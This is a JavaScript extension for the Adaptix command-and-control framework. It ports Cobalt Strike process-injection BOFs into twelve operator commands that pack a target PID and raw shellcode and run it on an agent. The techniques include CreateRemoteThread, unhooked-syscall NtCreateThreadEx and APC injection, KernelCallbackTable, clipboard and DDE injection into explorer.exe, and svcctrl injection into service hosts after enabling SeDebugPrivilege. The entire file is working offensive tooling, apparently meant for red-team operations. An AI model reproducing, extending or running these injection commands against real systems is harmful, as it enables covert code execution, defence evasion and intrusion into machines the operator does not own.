var metadata = {
    name: "CS-Injection-BOF",
    description: "Ported Cobalt Strike CS-Remote-OPs Injection BOFs (prefix: cs_)"
};

/// COMMANDS
//
// Original CS aliases -> Adaptix commands (with cs_ prefix)
//   createremotethread  -> cs_createremotethread <pid> <shellcode>
//   setthreadcontext    -> cs_setthreadcontext   <pid> <shellcode>
//   ntcreatethread      -> cs_ntcreatethread     <pid> <shellcode>
//   ntqueueapcthread    -> cs_ntqueueapcthread   <pid> <shellcode>
//   kernelcallbacktable -> cs_kernelcallbacktable<pid> <shellcode>
//   tooltip             -> cs_tooltip            <pid> <shellcode>
//   uxsubclassinfo      -> cs_uxsubclassinfo     <shellcode>          (explorer.exe only)
//   clipboardinject     -> cs_clipboardinject    <pid> <shellcode>
//   conhost             -> cs_conhost            <pid> <shellcode>
//   ctray               -> cs_ctray              <shellcode>          (explorer.exe only)
//   dde                 -> cs_dde                <shellcode>          (explorer.exe only, runs 4x)
//   svcctrl             -> cs_svcctrl            <pid> <shellcode>    (svchost.exe/spoolsv.exe)
//
// bof_pack signature reference (from CS .cna):
//   <pid,shellcode>   pack "ib"  ->  Adaptix "int,bytes"
//   <shellcode>       pack "b"   ->  Adaptix "bytes"
//


// ---- helper: build a PID+SHELLCODE injector command with the standard "ib" pack
function make_pid_shellcode_cmd(name, description, example, bof_stem, task_msg) {
    let cmd = ax.create_command(name, description, example);
    cmd.addArgInt("pid", true, "Target PID (0 = spawn temporary process; not supported by every technique)");
    cmd.addArgFile("shellcode", true, "Local path to raw shellcode file");
    cmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
        let pid = parsed_json["pid"];
        let shellcode_content = parsed_json["shellcode"];

        let bof_params = ax.bof_pack("int,bytes", [pid, shellcode_content]);
        let bof_path = ax.script_dir() + "_bin/" + bof_stem + "." + ax.arch(id) + ".o";

        ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, task_msg);
    });
    return cmd;
}

// ---- helper: build a SHELLCODE-only injector command with pack "b"
function make_shellcode_only_cmd(name, description, example, bof_stem, task_msg) {
    let cmd = ax.create_command(name, description, example);
    cmd.addArgFile("shellcode", true, "Local path to raw shellcode file");
    cmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
        let shellcode_content = parsed_json["shellcode"];

        let bof_params = ax.bof_pack("bytes", [shellcode_content]);
        let bof_path = ax.script_dir() + "_bin/" + bof_stem + "." + ax.arch(id) + ".o";

        ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, task_msg);
    });
    return cmd;
}


// ---- PID-targeted injectors -----------------------------------------------

var cmd_createremotethread = make_pid_shellcode_cmd(
    "cs_createremotethread",
    "CreateRemoteThread injection technique",
    "cs_createremotethread 1234 /tmp/shellcode.bin",
    "createremotethread",
    "Task: cs_createremotethread injection"
);

var cmd_setthreadcontext = make_pid_shellcode_cmd(
    "cs_setthreadcontext",
    "SetThreadContext injection technique",
    "cs_setthreadcontext 1234 /tmp/shellcode.bin",
    "setthreadcontext",
    "Task: cs_setthreadcontext injection"
);

var cmd_ntcreatethread = make_pid_shellcode_cmd(
    "cs_ntcreatethread",
    "NtCreateThreadEx injection using unhooked ntdll syscalls",
    "cs_ntcreatethread 1234 /tmp/shellcode.bin",
    "ntcreatethread",
    "Task: cs_ntcreatethread injection"
);

var cmd_ntqueueapcthread = make_pid_shellcode_cmd(
    "cs_ntqueueapcthread",
    "NtQueueApcThreadEx injection using unhooked ntdll syscalls",
    "cs_ntqueueapcthread 1234 /tmp/shellcode.bin",
    "ntqueueapcthread",
    "Task: cs_ntqueueapcthread injection"
);

var cmd_kernelcallbacktable = make_pid_shellcode_cmd(
    "cs_kernelcallbacktable",
    "KernelCallbackTable injection (target must be a GUI process that handles window messages)",
    "cs_kernelcallbacktable 1234 /tmp/shellcode.bin",
    "kernelcallbacktable",
    "Task: cs_kernelcallbacktable injection"
);

var cmd_tooltip = make_pid_shellcode_cmd(
    "cs_tooltip",
    "Tooltip injection (target must own a window with tooltips, e.g. explorer.exe)",
    "cs_tooltip 1234 /tmp/shellcode.bin",
    "tooltip",
    "Task: cs_tooltip injection"
);

var cmd_clipboardinject = make_pid_shellcode_cmd(
    "cs_clipboardinject",
    "Clipboard-based injection (targets processes with clipboard windows, e.g. explorer.exe / vmtoolsd.exe / clipsvc svchost)",
    "cs_clipboardinject 1234 /tmp/shellcode.bin",
    "clipboardinject",
    "Task: cs_clipboardinject injection"
);

var cmd_conhost = make_pid_shellcode_cmd(
    "cs_conhost",
    "conhost injection (target the console app; injection lands in its child conhost.exe). Does not work on Win7 (parent is csrss.exe).",
    "cs_conhost 1234 /tmp/shellcode.bin",
    "conhost",
    "Task: cs_conhost injection"
);

var cmd_svcctrl = ax.create_command(
    "cs_svcctrl",
    "svcctrl injection - overwrite a service dispatch table in a service-hosting process (svchost.exe/spoolsv.exe). Enables SeDebugPrivilege first.",
    "cs_svcctrl 1234 /tmp/shellcode.bin"
);
cmd_svcctrl.addArgInt("pid", true, "PID of a service-hosting process");
cmd_svcctrl.addArgFile("shellcode", true, "Local path to raw shellcode file");
cmd_svcctrl.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let shellcode_content = parsed_json["shellcode"];

    let bof_params = ax.bof_pack("int,bytes", [pid, shellcode_content]);
    let bof_path = ax.script_dir() + "_bin/svcctrl." + ax.arch(id) + ".o";

    // The original CS alias called bgetprivs SeDebugPrivilege first. Beacon does that via `getprivs`.
    ax.execute_alias(id, cmdline, `getprivs SeDebugPrivilege`, "Task: request SeDebugPrivilege for cs_svcctrl");
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_svcctrl injection");
});


// ---- Fixed-target injectors (no PID) --------------------------------------

var cmd_uxsubclassinfo = make_shellcode_only_cmd(
    "cs_uxsubclassinfo",
    "uxsubclassinfo injection - always targets explorer.exe",
    "cs_uxsubclassinfo /tmp/shellcode.bin",
    "uxsubclassinfo",
    "Task: cs_uxsubclassinfo injection (explorer.exe)"
);

var cmd_ctray = make_shellcode_only_cmd(
    "cs_ctray",
    "ctray injection - always targets explorer.exe",
    "cs_ctray /tmp/shellcode.bin",
    "ctray",
    "Task: cs_ctray injection (explorer.exe)"
);

var cmd_dde = make_shellcode_only_cmd(
    "cs_dde",
    "DDE injection into explorer.exe. WARNING: shellcode is executed FOUR times, plan accordingly.",
    "cs_dde /tmp/shellcode.bin",
    "dde",
    "Task: cs_dde injection (explorer.exe, x4)"
);


/// REGISTER GROUP

var group_cs_injection = ax.create_commands_group("CS-Injection-BOF", [
    cmd_createremotethread,
    cmd_setthreadcontext,
    cmd_ntcreatethread,
    cmd_ntqueueapcthread,
    cmd_kernelcallbacktable,
    cmd_tooltip,
    cmd_clipboardinject,
    cmd_conhost,
    cmd_svcctrl,
    cmd_uxsubclassinfo,
    cmd_ctray,
    cmd_dde
]);
ax.register_commands_group(group_cs_injection, ["beacon", "gopher", "kharon"], ["windows"], []);
